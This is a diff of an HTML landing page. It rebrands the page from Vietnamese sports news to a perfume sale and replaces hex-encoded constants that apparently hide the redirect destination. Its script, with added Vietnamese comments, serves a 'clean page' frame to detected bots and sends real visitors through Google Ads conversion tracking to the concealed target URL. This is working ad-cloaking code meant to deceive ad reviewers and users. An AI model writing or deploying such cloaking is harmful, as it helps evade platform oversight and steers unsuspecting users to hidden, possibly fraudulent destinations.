@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-  <title>Tin Thể Thao 24/7 - Lịch Thi Đấu & Kết Quả Mới Nhất</title>
-  <meta name="description" content="Cập nhật tin thể thao, lịch thi đấu bóng đá hôm nay, bảng xếp hạng các giải đấu hàng đầu.">
-  <link rel="canonical" href="https://thethao.linkxemnhanh.com/121/">
+  <title>[DEAL] Nước Hoa Niche & Designer Chính Hãng Pháp - Seal Fullbox 100%</title>
+  <meta name="description" content="Bộ sưu tập hương thơm cao cấp nhập khẩu chính hãng, đầy đủ hóa đơn, thử mùi tận nơi tại Showroom.">
+  <link rel="canonical" href="https://deal.linkxemnhanh.com/121/">
 
   <!-- OpenGraph Meta -->
-  <meta property="og:title" content="Tin Thể Thao 24/7 - Lịch Thi Đấu & Kết Quả Mới Nhất">
-  <meta property="og:description" content="Cập nhật tin thể thao, lịch thi đấu bóng đá hôm nay, bảng xếp hạng các giải đấu hàng đầu.">
+  <meta property="og:title" content="[DEAL] Nước Hoa Niche & Designer Chính Hãng Pháp - Seal Fullbox 100%">
+  <meta property="og:description" content="Bộ sưu tập hương thơm cao cấp nhập khẩu chính hãng, đầy đủ hóa đơn, thử mùi tận nơi tại Showroom.">
   <meta property="og:type" content="website">
 
   <style>
@@ -43,8 +43,8 @@
   <script>
     (function() {
       const K = "121";
-      const D = "";
-      const S = "7c747a0d187271f39384e2f287d2d8edaf1d5d417529070f433a29dbc482feebdb8f84bea01956797626120725722bd6caf7b3e99acabaada1164b74792117063e6e20d6c9e3ac92c8d0b7f6050b192d355d15193528";
+      const D = "7c747a0d187271f39999d3a0c2ba84bcb30b06007a680415052933d0869ddcafc7a58cf8fb7040202b384e5063682ada9cf6fae9c386e7f0ff5e472c373f42583274778a90f4a4c3ca9da2a86c5c4b777412140a366181e5c8f4e9918c8ab8ad47051c2b7e030f0d2f24c0d7f3f9afcaa3bcadaa4978726e620e03273026d5c4cbf0e890b7b7aa585a45726f131704362d958c9beef39fbd81bea15c55413f3a3346591c23d2d8e6f3fa92c0e49bef0814362f3d5d5662647d8b83a4b0aacbd9f1f2fe18192727404c4e6775958e9abcb5c3dbdce8e20311092a3650515f7f7884869fadadc6d2f4edfb1314203a3b4941626e688997b7b0bcded7e5e5fe0a0c25332b4c58727381999aa6a0c1cf";
+      const S = "7c747a0d187271f39999d3a0c2ba85aba45b5f5c7c29070f496a00dbd6c0f9a79c8c8cf8fa72";
       const E_AW = "";
       const E_CL = "";
       const E_PX = "";
@@ -71,7 +71,7 @@
           const separator = rawUrl.indexOf("?") !== -1 ? "&" : "?";
           const toAppend = [];
           incoming.forEach((val, key) => {
-            if (key === "a") return;
+            if (key === "a") return; // Bảo vệ mã liên kết gốc 'a'
             const keyRegex = new RegExp("[?&]" + key + "=(.*?)(?:&|$)", "i");
             if (!keyRegex.test(rawUrl)) {
               toAppend.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
@@ -123,6 +123,7 @@
         }
       }
 
+      // Khởi tạo Tracking động chỉ khi người dùng có cấu hình ID
       function initTracking() {
         if (awId) {
           try {
@@ -155,6 +156,7 @@
         }
       }
 
+      // Điều hướng kèm chuyển đổi Google Ads
       let redirected = false;
       function performRedirect(rep) {
         if (redirected) return;
@@ -178,12 +180,15 @@
       };
 
       if (isBot || !targetUrl) {
+        // Nạp trang sạch cho Bot hoặc khi chưa có Tracking Link
         const frame = document.getElementById("safe-frame");
         if (frame) frame.src = safeUrl;
         const curtain = document.getElementById("transit-curtain");
         if (curtain) curtain.classList.add("hide");
       } else {
+        // Người dùng thật: Kích hoạt tracking & chuyển tiếp
         initTracking();
+
         if (awId && label) {
           setTimeout(function() {
             if (typeof window.gtag === "function") {
@@ -204,6 +209,7 @@
           }, 120);
         }
 
+        // Fallback hiện nút bấm nếu trình duyệt chặn chuyển trang tự động
         setTimeout(function() {
           const btn = document.getElementById("manualCtaBtn");
           if (btn) btn.style.display = "inline-block";
